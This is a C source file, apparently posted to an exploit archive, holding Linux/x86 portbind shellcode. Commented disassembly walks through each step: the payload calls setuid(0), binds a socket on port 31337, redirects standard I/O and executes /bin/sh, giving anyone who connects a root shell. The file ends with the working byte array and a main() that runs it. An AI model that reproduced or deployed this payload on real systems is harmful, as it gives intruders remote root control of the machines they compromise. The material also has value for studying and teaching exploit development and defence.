/*
 * $Id: portbind-linux.c,v 1.4 2004/06/02 12:22:30 raptor Exp $
 *
 * portbind-linux.c - setuid/portbind shellcode for Linux/x86
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Simple portbind shellcode that bind()'s a setuid(0) shell on
 * port 31337/tcp (based on bighawk's code).
 *
 * Tested on Linux.
 */

/*
 * setuid(0)
 *
 * 8049380:       31 c0                   xor    %eax,%eax
 * 8049382:       31 db                   xor    %ebx,%ebx
 * 8049384:       b0 17                   mov    $0x17,%al
 * 8049386:       cd 80                   int    $0x80
 *
 * socket(AF_INET, SOCK_STREAM, 0)
 *
 * 8049388:       31 db                   xor    %ebx,%ebx
 * 804938a:       f7 e3                   mul    %ebx
 * 804938c:       b0 66                   mov    $0x66,%al
 * 804938e:       53                      push   %ebx
 * 804938f:       43                      inc    %ebx
 * 8049390:       53                      push   %ebx
 * 8049391:       43                      inc    %ebx
 * 8049392:       53                      push   %ebx
 * 8049393:       89 e1                   mov    %esp,%ecx
 * 8049395:       4b                      dec    %ebx
 * 8049396:       cd 80                   int    $0x80
 *
 * bind(s, server, sizeof(server))
 *
 * 8049398:       89 c7                   mov    %eax,%edi
 * 804939a:       52                      push   %edx
 * 804939b:       66 68 7a 69             pushw  $0x697a
 * 804939f:       43                      inc    %ebx
 * 80493a0:       66 53                   push   %bx
 * 80493a2:       89 e1                   mov    %esp,%ecx
 * 80493a4:       b0 10                   mov    $0x10,%al
 * 80493a6:       50                      push   %eax
 * 80493a7:       51                      push   %ecx
 * 80493a8:       57                      push   %edi
 * 80493a9:       89 e1                   mov    %esp,%ecx
 * 80493ab:       b0 66                   mov    $0x66,%al
 * 80493ad:       cd 80                   int    $0x80
 *
 * listen(s, 1)
 *
 * 80493af:       b0 66                   mov    $0x66,%al
 * 80493b1:       b3 04                   mov    $0x4,%bl
 * 80493b3:       cd 80                   int    $0x80
 *
 * accept(s, 0, 0)
 *
 * 80493b5:       50                      push   %eax
 * 80493b6:       50                      push   %eax
 * 80493b7:       57                      push   %edi
 * 80493b8:       89 e1                   mov    %esp,%ecx
 * 80493ba:       43                      inc    %ebx
 * 80493bb:       b0 66                   mov    $0x66,%al
 * 80493bd:       cd 80                   int    $0x80
 *
 * dup2(c, 2)
 * dup2(c, 1)
 * dup2(c, 0)
 *
 * 80493bf:       89 d9                   mov    %ebx,%ecx
 * 80493c1:       89 c3                   mov    %eax,%ebx
 * 80493c3:       b0 3f                   mov    $0x3f,%al
 * 80493c5:       49                      dec    %ecx
 * 80493c6:       cd 80                   int    $0x80
 * 80493c8:       41                      inc    %ecx
 * 80493c9:       e2 f8                   loop   80493c3 <sc+0x43>
 *
 * execve("/bin/sh", ["/bin/sh"], NULL)
 *
 * 80493cb:       51                      push   %ecx
 * 80493cc:       68 6e 2f 73 68          push   $0x68732f6e
 * 80493d1:       68 2f 2f 62 69          push   $0x69622f2f
 * 80493d6:       89 e3                   mov    %esp,%ebx
 * 80493d8:       51                      push   %ecx
 * 80493d9:       53                      push   %ebx
 * 80493da:       89 e1                   mov    %esp,%ecx
 * 80493dc:       b0 0b                   mov    $0xb,%al
 * 80493de:       cd 80                   int    $0x80
 * 80493e0:       00 00                   add    %al,(%eax)
 */

char sc[] = /* 8 + 88 = 96 bytes */
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80"
"\x89\xc7\x52\x66\x68"
"\x7a\x69" // port 31337/tcp, change if needed
"\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80"
"\xb0\x66\xb3\x04\xcd\x80"
"\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80"
"\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80"
"\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{
	int (*f)() = (int (*)())sc; f();
}

// milw0rm.com [2006-07-20]